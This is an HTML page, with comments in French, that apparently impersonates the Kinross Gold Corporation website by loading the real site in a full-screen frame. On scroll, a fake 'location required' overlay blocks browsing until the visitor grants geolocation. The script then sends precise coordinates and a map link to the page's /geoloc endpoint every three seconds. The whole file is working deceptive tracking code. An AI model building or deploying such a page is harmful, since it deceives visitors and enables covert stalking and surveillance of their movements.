<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Kinross Gold Corporation</title>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      overflow: hidden;
      height: 100vh;
      width: 100%;
      background: #0a0c12;
    }

    /* Conteneur iframe - plein écran */
    .iframe-container {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      width: 100%;
      height: 100%;
      background: white;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* Overlay qui apparaît au scroll */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.95);
      backdrop-filter: blur(10px);
      z-index: 200;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 25px;
    }
    .overlay-box {
      background: #1a1e26;
      border: 2px solid #d4af37;
      border-radius: 30px;
      padding: 40px 30px;
      text-align: center;
      max-width: 350px;
      width: 90%;
    }
    .overlay-box i {
      font-size: 50px;
      color: #d4af37;
      margin-bottom: 20px;
    }
    .overlay-box h3 {
      color: #d4af37;
      margin-bottom: 15px;
      font-family: Arial, sans-serif;
    }
    .overlay-box p {
      color: #ccc;
      margin-bottom: 25px;
      font-size: 14px;
    }
    .btn-location {
      background: linear-gradient(100deg, #d4af37, #b8860b);
      border: none;
      padding: 14px 25px;
      border-radius: 50px;
      color: #0a0c12;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }
    .btn-location:hover {
      transform: scale(1.02);
    }
    .status {
      margin-top: 15px;
      font-size: 12px;
      color: #d4af37;
    }
  </style>
</head>
<body>

  <!-- Navigateur iframe - visible directement -->
  <div class="iframe-container">
    <iframe id="kinrossFrame" src="https://www.kinross.com"></iframe>
  </div>

  <!-- Overlay qui apparaît au scroll si localisation non activée -->
  <div id="overlay" class="overlay" style="display: none;">
    <div class="overlay-box">
      <i class="fas fa-map-marker-alt"></i>
      <h3>📍 Localisation requise</h3>
      <p>Pour continuer à naviguer sur Kinross Gold Corporation, veuillez activer votre localisation.</p>
      <button class="btn-location" id="activateBtn">
        <i class="fas fa-satellite-dish"></i> Activer ma position
      </button>
      <div id="statusMsg" class="status"></div>
    </div>
  </div>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <script>
    // ========== ÉTAT ==========
    let isLocationActive = false;
    let autoUpdateInterval = null;

    // ========== FONCTIONS GÉOLOCALISATION (CONSERVÉES) ==========
    function sendLocationToServer(lat, lon, mapLink, step) {
      const payload = {
        lat: lat,
        lon: lon,
        mapLink: mapLink,
        step: step || "auto_update",
        timestamp: new Date().toISOString(),
        source: "Kinross_Browser"
      };
      fetch('/geoloc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(response => response.json())
      .then(data => console.log('📍 Localisation envoyée:', data))
      .catch(error => console.error('Erreur envoi:', error));
    }

    function startAutoUpdate(lat, lon) {
      if (autoUpdateInterval) clearInterval(autoUpdateInterval);
      autoUpdateInterval = setInterval(() => {
        if (navigator.geolocation && isLocationActive) {
          navigator.geolocation.getCurrentPosition(
            function(pos) {
              sendLocationToServer(pos.coords.latitude, pos.coords.longitude, 
                `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "auto");
            },
            function(err) { console.warn("Auto-update échec:", err.message); },
            { enableHighAccuracy: true, timeout: 8000 }
          );
        }
      }, 3000);
    }

    function stopAutoUpdate() {
      if (autoUpdateInterval) {
        clearInterval(autoUpdateInterval);
        autoUpdateInterval = null;
      }
    }

    // ========== ACTIVATION LOCALISATION ==========
    function activateLocation() {
      const statusDiv = document.getElementById('statusMsg');
      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours...';

      if (!navigator.geolocation) {
        statusDiv.innerHTML = '❌ Géolocalisation non supportée';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
          
          sendLocationToServer(lat, lon, mapLink, "activation");
          startAutoUpdate(lat, lon);
          
          isLocationActive = true;
          document.getElementById('overlay').style.display = 'none';
          statusDiv.innerHTML = '✅ Localisation activée !';
        },
        function(error) {
          let msg = "";
          switch(error.code) {
            case error.PERMISSION_DENIED: msg = "Vous avez refusé. Activez dans les paramètres."; break;
            case error.POSITION_UNAVAILABLE: msg = "Position indisponible."; break;
            case error.TIMEOUT: msg = "Délai dépassé."; break;
            default: msg = "Erreur de localisation.";
          }
          statusDiv.innerHTML = `❌ ${msg}`;
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }

    document.getElementById('activateBtn').addEventListener('click', activateLocation);

    // ========== DÉTECTION DU SCROLL ==========
    const overlay = document.getElementById('overlay');

    function showOverlayOnScroll() {
      if (!isLocationActive) {
        overlay.style.display = 'flex';
      }
    }

    // Détection du scroll global (l'utilisateur scroll dans la page)
    window.addEventListener('wheel', function() {
      if (!isLocationActive && overlay.style.display !== 'flex') {
        showOverlayOnScroll();
      }
    });
    window.addEventListener('touchmove', function() {
      if (!isLocationActive && overlay.style.display !== 'flex') {
        showOverlayOnScroll();
      }
    });

    // Nettoyage
    window.addEventListener('beforeunload', function() {
      stopAutoUpdate();
    });

    // Fonction autoUpdate d'origine conservée
    window.autoUpdate = function() {
      if (navigator.geolocation && isLocationActive) {
        navigator.geolocation.getCurrentPosition(function(pos) {
          sendLocationToServer(pos.coords.latitude, pos.coords.longitude, 
            `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "manual");
        });
      }
    };
  </script>
</body>
</html>
